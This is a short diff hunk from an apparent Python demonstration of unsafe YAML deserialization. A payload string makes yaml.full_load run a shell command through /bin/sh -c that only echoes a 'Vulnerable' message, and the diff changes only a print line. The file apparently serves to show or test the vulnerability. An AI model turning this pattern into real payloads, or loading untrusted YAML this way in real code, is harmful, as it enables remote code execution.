@@ -11,7 +11,7 @@ payload = """
 - ["/bin/sh", "-c", "echo '🔥 Vulnerable: Code executed from YAML'"]
 """
 
-print("📦 Loading malicious YAML with full_load...\n")
+print("📦 Loading malicious YAML\n")
 
 try:
     yaml.full_load(payload)
